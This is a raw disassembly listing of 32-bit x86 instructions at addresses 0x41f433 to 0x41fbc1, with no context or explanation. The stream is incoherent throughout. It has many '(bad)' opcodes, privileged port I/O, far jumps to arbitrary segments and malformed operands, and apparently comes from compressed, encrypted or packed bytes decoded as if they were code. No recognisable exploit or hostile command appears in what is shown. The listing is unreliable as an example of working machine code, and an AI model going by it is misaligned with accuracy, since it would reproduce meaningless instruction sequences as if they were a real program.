  41f433:	and    cl,BYTE PTR ds:0xb9bb7a21
  41f439:	push   cs
  41f43a:	xchg   ecx,eax
  41f43b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f43c:	cmp    al,BYTE PTR [edx-0xe]
  41f43f:	lds    esi,FWORD PTR [ebx+eax*2]
  41f442:	adc    eax,DWORD PTR [ebp+0x2a21ad21]
  41f448:	ins    DWORD PTR es:[edi],dx
  41f449:	cli    
  41f44a:	imul   ebp,ecx,0x57e88722
  41f450:	push   ds
  41f451:	mov    ds:0xc16e7c46,al
  41f456:	mov    es:0x17876836,al
  41f45c:	push   ebp
  41f45d:	rcr    BYTE PTR [ebp+eiz*1+0x74],0xd2
  41f462:	lods   eax,DWORD PTR ds:[esi]
  41f463:	cs (bad) 
  41f465:	sub    al,cl
  41f467:	dec    esi
  41f468:	push   edx
  41f469:	push   esp
  41f46a:	cmp    eax,0x65ec419b
  41f46f:	adc    DWORD PTR [edi-0x5c73ce2e],eax
  41f475:	mov    al,ds:0x4514bd3c
  41f47a:	sbb    bh,BYTE PTR [esi-0xb]
  41f47d:	js     0x41f46c
  41f47f:	addr16 loope 0x41f4d6
  41f482:	lahf   
  41f483:	push   es
  41f484:	dec    edx
  41f485:	mov    al,0xbb
  41f487:	test   al,0x62
  41f489:	xchg   ebx,eax
  41f48a:	es stos DWORD PTR es:[edi],eax
  41f48c:	(bad)  
  41f48f:	sub    edx,ebx
  41f491:	xchg   DWORD PTR [ecx+0x4d],ecx
  41f494:	test   eax,0xa83cdd91
  41f499:	loope  0x41f470
  41f49b:	sbb    al,0xb1
  41f49d:	mov    edi,0xc4e2a65b
  41f4a2:	lods   al,BYTE PTR cs:[esi]
  41f4a4:	lods   eax,DWORD PTR ds:[esi]
  41f4a5:	pop    ebp
  41f4a6:	or     DWORD PTR ss:0x13a4b7d5,esp
  41f4ad:	das    
  41f4ae:	mov    DWORD PTR [ebx+0x1],edx
  41f4b1:	loope  0x41f43e
  41f4b3:	sbb    al,0xe1
  41f4b5:	nop
  41f4b6:	outs   dx,BYTE PTR ds:[esi]
  41f4b7:	sbb    BYTE PTR [ebx-0x26],dh
  41f4ba:	mov    dh,0xe3
  41f4bc:	stc    
  41f4bd:	in     al,0x85
  41f4bf:	push   ebx
  41f4c0:	inc    edx
  41f4c1:	outs   dx,BYTE PTR ds:[esi]
  41f4c2:	loop   0x41f4c4
  41f4c4:	js     0x41f534
  41f4c6:	dec    esp
  41f4c7:	sub    ah,BYTE PTR [ecx+0x5d4684aa]
  41f4cd:	dec    edi
  41f4ce:	and    eax,ebp
  41f4d0:	fistp  QWORD PTR [ebp-0x74e94311]
  41f4d6:	ins    BYTE PTR es:[edi],dx
  41f4d7:	sbb    ecx,esp
  41f4d9:	mov    ecx,DWORD PTR [esi-0x2b071735]
  41f4df:	xor    ebx,DWORD PTR [edx-0x3d]
  41f4e2:	sbb    al,0xa7
  41f4e4:	mov    ds:0x2008e27,al
  41f4e9:	fiadd  DWORD PTR [ecx+eax*4-0x6e]
  41f4ed:	xchg   edx,eax
  41f4ee:	clc    
  41f4ef:	ins    BYTE PTR es:[edi],dx
  41f4f0:	fidiv  WORD PTR [ecx-0x7f]
  41f4f3:	cdq    
  41f4f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f4f5:	lods   al,BYTE PTR ds:[esi]
  41f4f6:	data16 mov dh,0x22
  41f4f9:	xor    dl,BYTE PTR [eax-0x77]
  41f4fc:	(bad)  
  41f4fd:	shr    DWORD PTR [eax],0xd2
  41f500:	js     0x41f55d
  41f502:	push   edx
  41f503:	mov    WORD PTR [edi+0x2a],ds
  41f506:	push   esi
  41f507:	cmp    BYTE PTR [ebx+0x137bacd4],dl
  41f50d:	(bad)  
  41f50e:	out    dx,eax
  41f50f:	or     al,0x23
  41f511:	inc    eax
  41f512:	xchg   ebp,eax
  41f513:	call   0x81790315
  41f518:	adc    eax,0xa212491e
  41f51d:	pop    esi
  41f51e:	test   DWORD PTR [edi-0x4],ebp
  41f521:	jp     0x41f4c3
  41f523:	lds    esp,FWORD PTR [ebp+0x2c]
  41f526:	push   edi
  41f527:	jno    0x41f4d9
  41f529:	mov    edx,0xd7925ae2
  41f52e:	inc    edx
  41f52f:	mov    edi,0x85256760
  41f534:	and    BYTE PTR [ebp+0x1a345174],al
  41f53a:	out    dx,al
  41f53b:	cdq    
  41f53c:	rol    BYTE PTR [eax+0x2f1c938f],cl
  41f542:	test   eax,0x7fe3863f
  41f547:	mov    bl,BYTE PTR [edx+0x256b5ad1]
  41f54d:	push   es
  41f54e:	clc    
  41f54f:	mov    al,ds:0x70ccf792
  41f554:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f555:	xor    BYTE PTR [edi-0x27],cl
  41f558:	je     0x41f508
  41f55a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f55b:	cmp    al,0x2
  41f55d:	mov    ebp,0x7ed791b3
  41f562:	test   al,0x1b
  41f564:	mov    ebx,0xd75ff3ea
  41f569:	sahf   
  41f56a:	js     0x41f4fb
  41f56c:	lea    edx,[ebx-0x16ffcdc6]
  41f572:	mov    dh,0xf9
  41f574:	sub    DWORD PTR [ebp+0x7d1f106c],ebx
  41f57a:	push   esi
  41f57b:	mov    al,0xa
  41f57d:	mov    esp,0x8b6fa871
  41f582:	repz cmp al,0x6a
  41f585:	gs lahf 
  41f587:	(bad)  
  41f589:	ret    0xa1e6
  41f58c:	ins    BYTE PTR es:[edi],dx
  41f58d:	lea    ebx,[eax-0x75]
  41f590:	adc    BYTE PTR [ebx],dl
  41f592:	sahf   
  41f593:	mov    ebp,0x5b0365a0
  41f598:	ror    BYTE PTR [ebp+0x11f3567b],0xf1
  41f59f:	mov    esp,DWORD PTR [eax]
  41f5a1:	cwde   
  41f5a2:	out    dx,eax
  41f5a3:	iret   
  41f5a4:	in     al,dx
  41f5a5:	mov    edi,0xb1bd0ae9
  41f5aa:	bound  edx,QWORD PTR [eax+0x79]
  41f5ad:	cmc    
  41f5ae:	lahf   
  41f5af:	adc    al,0x3b
  41f5b1:	in     al,0xcd
  41f5b3:	gs mov al,0x44
  41f5b6:	adc    ah,0xb3
  41f5b9:	in     al,dx
  41f5ba:	pop    eax
  41f5bb:	mov    ah,0x61
  41f5bd:	dec    ecx
  41f5be:	dec    esi
  41f5bf:	sbb    cl,cl
  41f5c1:	shl    BYTE PTR [ebx],1
  41f5c3:	sahf   
  41f5c4:	ret    
  41f5c5:	or     BYTE PTR [eax+0xd],dh
  41f5c8:	bound  ecx,QWORD PTR [ecx]
  41f5ca:	adc    BYTE PTR [edx+0x79827e7b],bl
  41f5d0:	jmp    0xcda02934
  41f5d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5d6:	mov    ds:0x803d8367,al
  41f5db:	xchg   BYTE PTR [edx],al
  41f5dd:	adc    dh,BYTE PTR [edi+0x43]
  41f5e0:	out    0x2b,al
  41f5e2:	std    
  41f5e3:	(bad)  
  41f5e4:	or     esi,ebx
  41f5e6:	pop    edx
  41f5e7:	in     al,0x25
  41f5e9:	ror    BYTE PTR [eax],0xc1
  41f5ec:	and    al,0x7a
  41f5ef:	fisub  DWORD PTR [edi+0x5c]
  41f5f2:	jmp    0x3a04:0xdd1280ee
  41f5f9:	xchg   ebp,eax
  41f5fa:	sbb    BYTE PTR [eax+0x50],ah
  41f5fd:	or     cl,BYTE PTR [eax+0x77c4f877]
  41f603:	adc    ebp,edx
  41f605:	outs   dx,BYTE PTR ds:[esi]
  41f606:	je     0x41f675
  41f608:	mov    esi,0x19853158
  41f60d:	jle    0x41f60d
  41f60f:	mov    ds:0xd15d9a45,eax
  41f614:	cld    
  41f615:	(bad)  
  41f616:	pop    esp
  41f617:	(bad)  
  41f618:	data16 icebp 
  41f61a:	(bad)  
  41f61b:	shl    DWORD PTR fs:[esi],cl
  41f61e:	hlt    
  41f61f:	mov    edi,0xf4131dfe
  41f624:	sbb    eax,0xfb6957f3
  41f629:	dec    edi
  41f62a:	aaa    
  41f62b:	lods   eax,DWORD PTR ds:[esi]
  41f62c:	retf   
  41f62d:	xor    BYTE PTR [esi-0x35],bh
  41f630:	lahf   
  41f631:	xchg   DWORD PTR [eax],ecx
  41f633:	xchg   edx,eax
  41f634:	sub    eax,ebp
  41f636:	xchg   ebp,eax
  41f637:	fsub   st(5),st
  41f639:	out    dx,al
  41f63a:	dec    ecx
  41f63b:	and    si,WORD PTR [ebx-0x37141dcd]
  41f642:	call   0xa42c:0x497a7674
  41f649:	dec    edx
  41f64a:	dec    ebx
  41f64b:	sub    esi,DWORD PTR [esi-0x54]
  41f64e:	and    al,BYTE PTR [ebx+0x26]
  41f651:	jbe    0x41f686
  41f653:	push   esp
  41f654:	shr    BYTE PTR [esi],1
  41f656:	mov    esp,0xdd50de80
  41f65b:	(bad)  
  41f65c:	fs inc edi
  41f65e:	adc    DWORD PTR [ebx],eax
  41f660:	inc    ecx
  41f661:	mov    BYTE PTR [esi],dh
  41f663:	pop    ecx
  41f664:	push   0x40d66708
  41f669:	adc    ch,BYTE PTR [eax-0x228eb091]
  41f66f:	cmp    dl,BYTE PTR [esi+0x63]
  41f672:	add    DWORD PTR [edi-0x5b67257a],ecx
  41f678:	and    eax,0x80c9ace5
  41f67d:	std    
  41f67e:	sub    ebp,0x313511cd
  41f684:	not    BYTE PTR [ebp+0x7672ac84]
  41f68a:	ins    DWORD PTR es:[edi],dx
  41f68b:	add    eax,esi
  41f68d:	push   ebx
  41f68e:	fnstenv [esp+edx*1]
  41f691:	rcl    BYTE PTR [ebp+0x15],1
  41f694:	sub    BYTE PTR ds:0xd7cd0d40,bh
  41f69a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f69b:	or     edi,eax
  41f69d:	cs je  0x41f6b1
  41f6a0:	xor    al,0x65
  41f6a2:	call   0xe39b44c3
  41f6a7:	aaa    
  41f6a8:	leave  
  41f6a9:	in     al,dx
  41f6aa:	mov    edi,0x91daa82f
  41f6af:	adc    eax,0xaa49e745
  41f6b4:	std    
  41f6b5:	mov    ebx,0xa217c514
  41f6ba:	dec    ecx
  41f6bb:	or     ecx,DWORD PTR [eax]
  41f6bd:	repnz ds popa 
  41f6c0:	cmp    DWORD PTR [edx+0x1c],ebp
  41f6c3:	sar    BYTE PTR [ebx+0x5b9a9dcd],cl
  41f6c9:	or     eax,0xc910ae8e
  41f6ce:	add    eax,0xb57ecebf
  41f6d3:	inc    ecx
  41f6d4:	fcom   QWORD PTR [edx]
  41f6d6:	sub    ch,dl
  41f6d8:	xor    ah,bh
  41f6da:	mov    ds:0xd7828dbd,eax
  41f6df:	jns    0x41f6b7
  41f6e1:	loopne 0x41f74a
  41f6e3:	jo     0x41f68b
  41f6e5:	add    DWORD PTR [ecx-0x36a90e6d],edi
  41f6eb:	dec    eax
  41f6ec:	mov    esp,0x7e573055
  41f6f1:	shr    BYTE PTR [esi+0x71b9daa6],0x64
  41f6f8:	cdq    
  41f6f9:	call   0x1b65:0x274dd198
  41f700:	data16 sub al,0xda
  41f703:	dec    ebx
  41f704:	icebp  
  41f705:	push   ecx
  41f706:	jae    0x41f75e
  41f708:	sub    BYTE PTR [edx],dh
  41f70a:	in     al,0xd7
  41f70c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f70d:	or     eax,0x6c548742
  41f712:	in     al,0x29
  41f714:	mov    dh,0xb2
  41f716:	jmp    0xadb3:0xf19a2f24
  41f71d:	jno    0x41f713
  41f71f:	not    BYTE PTR [ebp+0x53]
  41f722:	adc    ebp,DWORD PTR [eax+0x61]
  41f725:	add    BYTE PTR [edx],ch
  41f727:	xchg   BYTE PTR [edi],ah
  41f729:	mov    esi,esp
  41f72b:	mov    esp,?
  41f72d:	and    cl,BYTE PTR [eax+0x49]
  41f730:	cmp    bh,BYTE PTR [edi]
  41f732:	inc    esi
  41f733:	lods   eax,DWORD PTR ds:[esi]
  41f734:	pop    ebx
  41f735:	jg     0x41f72c
  41f737:	iret   
  41f738:	xor    DWORD PTR [ebp-0x59],edi
  41f73b:	jmp    0x41f6f1
  41f73d:	rol    BYTE PTR [ecx+0x1d],0xc8
  41f741:	mov    ds:0xc5f845fa,eax
  41f746:	div    DWORD PTR [ebx+0xa]
  41f749:	jae    0x41f7a9
  41f74b:	iret   
  41f74c:	lea    esp,ds:0x9720addb
  41f752:	jle    0x41f79c
  41f754:	mov    esi,eax
  41f756:	stos   BYTE PTR es:[edi],al
  41f757:	mov    esp,0xc1511a0c
  41f75c:	adc    al,0x18
  41f75e:	or     eax,0x3093f8cb
  41f763:	xor    eax,0xc98a105e
  41f768:	cmp    ah,dl
  41f76a:	push   ebx
  41f76b:	jge    0x41f7a1
  41f76d:	push   edi
  41f76e:	dec    esp
  41f76f:	xor    edi,ecx
  41f771:	int3   
  41f772:	retf   
  41f773:	mov    BYTE PTR ds:0xbaeb2f6f,0xd8
  41f77a:	jmp    0xfde14bd8
  41f77f:	xor    eax,0x6ac65407
  41f784:	xchg   DWORD PTR [eax],esi
  41f786:	out    dx,eax
  41f787:	in     eax,0x9e
  41f789:	xchg   edx,eax
  41f78a:	repz cmp al,0x7f
  41f78d:	loopne 0x41f7f3
  41f78f:	pusha  
  41f790:	jo     0x41f7e2
  41f792:	sub    eax,0xf1b318ae
  41f797:	sub    eax,0x94caa11
  41f79c:	fistp  DWORD PTR [edi-0x6d417734]
  41f7a2:	cmp    al,0x2c
  41f7a4:	inc    ecx
  41f7a5:	addr16 in al,dx
  41f7a7:	enter  0xeb4,0x8a
  41f7ab:	dec    edi
  41f7ac:	sub    al,0xce
  41f7ae:	ins    BYTE PTR es:[edi],dx
  41f7af:	scas   al,BYTE PTR es:[edi]
  41f7b0:	stos   DWORD PTR es:[edi],eax
  41f7b1:	idiv   ch
  41f7b3:	repnz imul edx,DWORD PTR [eax+0x1e538d],0x9964408e
  41f7be:	fstp   TBYTE PTR ds:0x64cd5271
  41f7c4:	loopne 0x41f7c0
  41f7c6:	inc    edi
  41f7c7:	pop    ds
  41f7c8:	std    
  41f7c9:	popa   
  41f7ca:	mov    esi,0xc6d25565
  41f7cf:	stc    
  41f7d0:	xor    al,0x4d
  41f7d2:	adc    al,BYTE PTR [ecx-0x78]
  41f7d5:	push   ds
  41f7d6:	int    0x2b
  41f7d8:	xor    al,0x32
  41f7da:	js     0x41f7d5
  41f7dc:	data16 (bad) 
  41f7de:	xor    eax,0x5812fa14
  41f7e3:	aaa    
  41f7e4:	dec    ecx
  41f7e5:	(bad)  
  41f7e6:	add    bl,BYTE PTR [esi-0x49]
  41f7e9:	test   DWORD PTR [ecx+0xb],ecx
  41f7ec:	pop    ebx
  41f7ed:	mov    esi,0x5729d309
  41f7f2:	into   
  41f7f3:	adc    bh,BYTE PTR [ebx+0x14]
  41f7f6:	jo     0x41f846
  41f7f8:	ret    
  41f7f9:	bound  esi,QWORD PTR [ebx]
  41f7fb:	adc    BYTE PTR [eax+0x31ab3ea8],cl
  41f801:	fsub   st(3),st
  41f803:	inc    edi
  41f804:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f805:	imul   ecx,DWORD PTR [ecx],0xfffffff9
  41f808:	ins    DWORD PTR es:[edi],dx
  41f809:	ja     0x41f87b
  41f80b:	ja     0x41f7bc
  41f80d:	gs mov ?,esi
  41f810:	mov    ecx,0xe60877bb
  41f815:	push   ebp
  41f816:	out    0x84,al
  41f818:	inc    ebx
  41f819:	out    0x7,eax
  41f81b:	arpl   WORD PTR [edi+eax*8+0x8],ax
  41f81f:	mov    DWORD PTR [ebx+0x3c0e871e],esi
  41f825:	xchg   edx,eax
  41f826:	push   ds
  41f827:	cs sbb al,0xe
  41f82a:	jae    0x41f7f9
  41f82c:	(bad)  
  41f82d:	in     eax,0xa6
  41f82f:	nop
  41f830:	(bad)  
  41f831:	and    BYTE PTR [ecx-0x109dce17],bl
  41f837:	ret    
  41f838:	dec    ebp
  41f839:	mov    edi,0x28ab84ff
  41f83e:	(bad)  
  41f83f:	jmp    0x38df18d
  41f844:	xor    eax,0xfb4acc75
  41f849:	xor    al,0xed
  41f84b:	repnz push ecx
  41f84d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f84e:	add    DWORD PTR [edx-0x30],0xcc1047b6
  41f855:	(bad)  
  41f856:	call   0xb3abcc4b
  41f85b:	pusha  
  41f85c:	sub    esp,DWORD PTR [ebp-0x5f]
  41f85f:	add    ch,0xa0
  41f862:	mov    ebp,0xddb6e1cb
  41f867:	push   ecx
  41f868:	push   0xffffff85
  41f86a:	cmp    bh,BYTE PTR [ecx+edi*4-0x13859940]
  41f871:	sbb    eax,0x4734a25f
  41f876:	mov    eax,0x11062434
  41f87b:	sbb    edx,DWORD PTR [esi+eax*2+0x64c590b7]
  41f882:	mov    ah,BYTE PTR [ebx]
  41f884:	dec    ebp
  41f885:	lds    esp,FWORD PTR [ecx+0x6a2ffe79]
  41f88b:	cwde   
  41f88c:	dec    edi
  41f88d:	fsub   DWORD PTR [edi-0xb]
  41f890:	pushf  
  41f891:	sub    eax,0x625d99f6
  41f896:	xchg   DWORD PTR [ecx-0x3b],esp
  41f899:	dec    ebx
  41f89b:	xchg   BYTE PTR [ebp+0x32],ah
  41f89e:	xchg   ecx,eax
  41f89f:	xor    BYTE PTR [esi-0x7ed03c1a],0x99
  41f8a6:	jmp    0xd0a711b7
  41f8ab:	jl     0x41f8f5
  41f8ad:	push   ds
  41f8ae:	push   cs
  41f8af:	adc    al,bh
  41f8b1:	pop    ecx
  41f8b2:	and    ah,0x7c
  41f8b5:	push   cs
  41f8b6:	icebp  
  41f8b7:	out    0x1c,eax
  41f8b9:	adc    edx,DWORD PTR [esi-0x4e]
  41f8bc:	mov    ds:0x2c7d9391,al
  41f8c1:	mov    eax,ds:0x46716b8e
  41f8c6:	add    cl,BYTE PTR [edi+0x18]
  41f8c9:	ror    DWORD PTR [edx+0x13],1
  41f8cc:	dec    edi
  41f8cd:	in     al,0x2e
  41f8cf:	daa    
  41f8d0:	add    ecx,edi
  41f8d2:	(bad)  
  41f8d3:	test   ebx,edi
  41f8d5:	iret   
  41f8d6:	imul   edx,DWORD PTR [eax],0x7a
  41f8d9:	xor    ebx,ebp
  41f8db:	sbb    eax,0x49d505a9
  41f8e0:	mov    BYTE PTR [edx],bl
  41f8e2:	push   esp
  41f8e3:	stos   BYTE PTR es:[edi],al
  41f8e4:	xlat   BYTE PTR ds:[ebx]
  41f8e5:	loop   0x41f8d4
  41f8e7:	int    0x72
  41f8e9:	inc    ebp
  41f8ea:	add    BYTE PTR [edx+0x796cdac8],0x1d
  41f8f1:	add    ebp,ebp
  41f8f3:	pop    ebx
  41f8f4:	pop    ebp
  41f8f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8f6:	xor    esi,DWORD PTR [edx-0x3e5264f4]
  41f8fc:	inc    edi
  41f8fd:	push   0xfffffff3
  41f8ff:	sbb    ecx,eax
  41f901:	and    BYTE PTR [ebx],ch
  41f903:	xlat   BYTE PTR ds:[ebx]
  41f904:	xchg   DWORD PTR [eax+0x4d79b146],edx
  41f90a:	in     eax,0x1
  41f90c:	test   al,0x74
  41f90e:	pop    edi
  41f90f:	loop   0x41f972
  41f911:	jae    0x41f8b5
  41f913:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f914:	push   cs
  41f915:	in     eax,0xa4
  41f917:	int    0xee
  41f919:	dec    esp
  41f91a:	adc    al,0xaa
  41f91c:	lahf   
  41f91d:	(bad)  
  41f91e:	jne    0x41f90f
  41f920:	ss ins DWORD PTR es:[edi],dx
  41f922:	popf   
  41f923:	or     al,ah
  41f925:	dec    edi
  41f926:	call   0xaf409c2
  41f92b:	xchg   esi,eax
  41f92c:	loop   0x41f8f0
  41f92e:	adc    BYTE PTR [eax+0x57],cl
  41f931:	pusha  
  41f932:	add    eax,0x24c4809c
  41f937:	fidivr WORD PTR [edi-0x17efa7db]
  41f93d:	fbld   TBYTE PTR [ebx+0x1b6650e8]
  41f943:	jp     0x41f931
  41f945:	and    DWORD PTR [esi],esi
  41f947:	aas    
  41f948:	xchg   ecx,eax
  41f949:	repnz push edi
  41f94b:	scas   eax,DWORD PTR es:[edi]
  41f94c:	sub    eax,0xb7c850f5
  41f951:	adc    dl,BYTE PTR [ecx-0x6e]
  41f954:	nop
  41f955:	fbstp  TBYTE PTR [ecx+edi*2]
  41f958:	ret    0x7ebc
  41f95b:	and    ebp,DWORD PTR [ecx]
  41f95d:	dec    esp
  41f95e:	pop    edx
  41f95f:	sahf   
  41f960:	adc    BYTE PTR [edi+ebp*8+0x43e0fc02],bl
  41f967:	fdivp  st(3),st
  41f969:	add    BYTE PTR [edi+0x31],bl
  41f96c:	inc    edi
  41f96d:	test   BYTE PTR [eax-0x18],ch
  41f970:	imul   eax,DWORD PTR [edx+0x78],0xffffff9e
  41f974:	cmp    al,0xe8
  41f976:	or     ch,BYTE PTR [edi-0x2daef807]
  41f97c:	mov    eax,0xb8963e81
  41f981:	fmul   DWORD PTR [ebx+0x6835639d]
  41f987:	or     ah,BYTE PTR [ebx-0x423f8b27]
  41f98d:	je     0x41f98f
  41f98f:	test   eax,0xca62b9b3
  41f994:	mov    esp,0xbe34ddaa
  41f999:	mov    cl,0x32
  41f99b:	mov    ebx,DWORD PTR [eax]
  41f99d:	lock pop eax
  41f99f:	pop    esi
  41f9a0:	mov    BYTE PTR [edx],ah
  41f9a2:	aad    0xfa
  41f9a4:	inc    esp
  41f9a5:	mov    al,ds:0x971ee4ea
  41f9aa:	pop    edi
  41f9ab:	aas    
  41f9ac:	jge    0x41f941
  41f9ae:	push   ds
  41f9af:	iret   
  41f9b0:	mov    edi,0x95ac2f66
  41f9b5:	jo     0x41fa09
  41f9b7:	inc    ecx
  41f9b8:	mov    BYTE PTR [edi+0x24dd7275],ch
  41f9be:	push   0xc
  41f9c0:	sbb    eax,0xebfe2fee
  41f9c5:	mov    eax,ds:0xe7e9de7e
  41f9ca:	fistp  DWORD PTR [ecx-0x4]
  41f9cd:	add    DWORD PTR [eax-0x639c13cb],ebx
  41f9d3:	enter  0x7213,0xad
  41f9d7:	pusha  
  41f9d8:	aad    0xb9
  41f9da:	mov    dl,0x6c
  41f9dc:	in     al,dx
  41f9dd:	inc    ebx
  41f9de:	inc    esp
  41f9df:	pop    es
  41f9e0:	jb     0x41f9ce
  41f9e2:	mov    ds:0x73d028da,eax
  41f9e7:	(bad)  
  41f9e8:	or     eax,0xdd2fbd1a
  41f9ed:	pop    edx
  41f9ee:	pop    ebx
  41f9ef:	or     al,0xe3
  41f9f1:	out    0x3f,eax
  41f9f3:	shr    DWORD PTR [edi],cl
  41f9f5:	shr    BYTE PTR [edi-0x6e464cbd],cl
  41f9fb:	mov    ebx,eax
  41f9fd:	dec    edx
  41f9fe:	cs data16 test al,0xce
  41fa03:	inc    edx
  41fa04:	and    BYTE PTR [esi+0x387fd695],bh
  41fa0a:	jmp    0x41fa7c
  41fa0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fa0d:	stc    
  41fa0e:	hlt    
  41fa0f:	out    0xd4,al
  41fa11:	mov    ch,0xb7
  41fa13:	lahf   
  41fa14:	inc    edi
  41fa15:	and    esi,0x11
  41fa18:	(bad)  
  41fa1a:	mov    al,ds:0xaadd6de9
  41fa1f:	xor    DWORD PTR [edx],ecx
  41fa21:	sub    al,0x15
  41fa23:	sbb    DWORD PTR [edi+0x372fb8f8],ecx
  41fa29:	mov    eax,0x640e8692
  41fa2e:	and    DWORD PTR [eax+ebx*1-0x7e],0x70
  41fa33:	sub    eax,0x4cf55b7e
  41fa38:	sub    BYTE PTR [ebp-0x1],ch
  41fa3b:	xchg   BYTE PTR [ecx-0x2c],dl
  41fa3e:	out    dx,eax
  41fa3f:	out    dx,al
  41fa40:	jmp    0x5a73:0x17b6e119
  41fa47:	in     eax,0x21
  41fa49:	jle    0x41faab
  41fa4b:	enter  0x638c,0xd1
  41fa4f:	das    
  41fa50:	push   ecx
  41fa51:	mov    edx,0x107171
  41fa56:	rcr    DWORD PTR [esi+ebx*1],1
  41fa59:	(bad)  
  41fa5a:	dec    esp
  41fa5b:	pusha  
  41fa5c:	fadd   DWORD PTR [ecx-0x71]
  41fa5f:	and    bl,BYTE PTR [edx]
  41fa61:	jno    0x41fa1f
  41fa63:	sbb    DWORD PTR [ebx+0x83c46d8],edi
  41fa69:	rcr    DWORD PTR ds:0xdd4ece8a,0xa8
  41fa70:	aad    0xe8
  41fa72:	aaa    
  41fa73:	mov    ecx,0xbf6eef69
  41fa78:	mov    eax,0xc3cedb9a
  41fa7d:	mov    ah,0xf2
  41fa7f:	mov    eax,0x7452d24d
  41fa84:	xor    al,0xfa
  41fa86:	fcmovu st,st(6)
  41fa88:	ror    BYTE PTR [edi-0x7b238696],0x86
  41fa8f:	add    al,BYTE PTR [ebx+0x1e]
  41fa92:	sbb    eax,0xa54d3b8b
  41fa97:	(bad)  
  41fa98:	fmul   QWORD PTR [ebx]
  41fa9a:	retf   
  41fa9b:	imul   eax,DWORD PTR [edi+0xe],0x5d713ab0
  41faa2:	adc    al,0x8b
  41faa4:	adc    BYTE PTR [edx+ecx*1-0x692f372c],ah
  41faab:	iret   
  41faac:	inc    ebx
  41faad:	and    BYTE PTR [ecx-0x44d4d050],ah
  41fab3:	gs xchg esi,eax
  41fab5:	push   ecx
  41fab6:	dec    ebp
  41fab7:	jno    0x41fab3
  41fab9:	bnd je 0x41fb19
  41fabc:	cmp    edi,ecx
  41fabe:	mov    dh,0x6e
  41fac0:	or     al,0xca
  41fac2:	test   dl,ch
  41fac4:	das    
  41fac5:	xor    al,0x15
  41fac7:	adc    ebp,DWORD PTR [eax-0x41b786e6]
  41facd:	out    dx,eax
  41face:	dec    eax
  41facf:	dec    ecx
  41fad0:	sbb    al,0x8f
  41fad2:	jne    0x41fab3
  41fad4:	rcl    BYTE PTR [edx+0x36],1
  41fad7:	test   eax,0xea974152
  41fadc:	lock sbb bl,BYTE PTR [edx+0x6a55aee]
  41fae3:	es in  al,0x5b
  41fae6:	jl     0x41fa68
  41fae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fae9:	push   ss
  41faea:	mov    edi,0x74b567fd
  41faef:	fisttp QWORD PTR [eax+0x15]
  41faf2:	mov    eax,0x1bbefcf
  41faf7:	cwde   
  41faf8:	mov    eax,ds:0x8d377583
  41fafd:	repnz lods al,BYTE PTR ds:[esi]
  41faff:	int    0x1
  41fb01:	stos   DWORD PTR es:[edi],eax
  41fb02:	inc    eax
  41fb03:	aaa    
  41fb04:	cmp    DWORD PTR [ecx+0x784e2aa7],0x8165819a
  41fb0e:	popf   
  41fb0f:	mov    DWORD PTR [ebx+0x4e],edx
  41fb12:	pop    esi
  41fb13:	jno    0x41fb7a
  41fb15:	mov    ds:0xc4f98c6a,al
  41fb1a:	fwait
  41fb1b:	adc    BYTE PTR [ecx+eiz*8-0x4a72864],dl
  41fb22:	dec    ebx
  41fb23:	cmp    esp,edx
  41fb25:	jns    0x41fac9
  41fb27:	dec    edx
  41fb28:	outs   dx,BYTE PTR ds:[esi]
  41fb29:	sbb    edx,DWORD PTR [edx-0x44]
  41fb2c:	(bad)  
  41fb2d:	cdq    
  41fb2e:	hlt    
  41fb2f:	fs ds pop es
  41fb32:	inc    ecx
  41fb33:	push   ss
  41fb34:	pushf  
  41fb35:	dec    ecx
  41fb36:	pop    edi
  41fb37:	aaa    
  41fb38:	loop   0x41fae7
  41fb3a:	mov    dh,bl
  41fb3c:	fistp  QWORD PTR [ecx]
  41fb3e:	xor    eax,0xc8d58969
  41fb43:	into   
  41fb44:	or     dl,bh
  41fb46:	mov    ebx,0x2bf0e9f
  41fb4b:	std    
  41fb4c:	push   ebp
  41fb4d:	pop    esp
  41fb4e:	out    0x94,al
  41fb50:	arpl   WORD PTR [esp],bp
  41fb53:	loope  0x41fb6e
  41fb55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fb56:	sbb    ebx,DWORD PTR ds:0xbe6f253e
  41fb5c:	mov    ch,0xa2
  41fb5e:	or     ah,BYTE PTR [ecx+0x59]
  41fb61:	xchg   ecx,eax
  41fb62:	cli    
  41fb63:	mov    BYTE PTR [esi],al
  41fb65:	inc    ecx
  41fb66:	dec    edx
  41fb67:	mov    ds:0x576d12a2,al
  41fb6c:	mov    edx,0x6d3a099a
  41fb71:	jle    0x41fbe6
  41fb73:	lock leave 
  41fb75:	sub    eax,DWORD PTR [esi-0x7919e1fc]
  41fb7b:	xchg   ecx,eax
  41fb7c:	cmp    DWORD PTR [esi+edi*8+0x5a],eax
  41fb80:	ins    BYTE PTR es:[edi],dx
  41fb81:	jg     0x41fbc6
  41fb83:	mov    ds:0xc178f85c,al
  41fb88:	and    al,0x1e
  41fb8a:	cld    
  41fb8b:	jge    0x41fb42
  41fb8d:	rcr    DWORD PTR [edi-0x3c8e0dc6],1
  41fb93:	xor    BYTE PTR [esi-0x151509b3],ch
  41fb99:	les    eax,FWORD PTR [edi]
  41fb9b:	adc    esi,ecx
  41fb9d:	dec    esp
  41fb9e:	call   0xbfc3:0x88ddbc26
  41fba5:	stos   BYTE PTR es:[edi],al
  41fba6:	mov    cl,BYTE PTR [ebx-0x21d9a0cd]
  41fbac:	jge    0x41fb77
  41fbae:	mov    eax,ds:0xe7eab3f6
  41fbb3:	sbb    ch,BYTE PTR [edi]
  41fbb5:	in     al,dx
  41fbb6:	pop    esp
  41fbb7:	jle    0x41fb9f
  41fbb9:	sbb    BYTE PTR [edx+esi*2-0x13bd1ca7],0xc1
  41fbc1:	loope  0x41fc3c
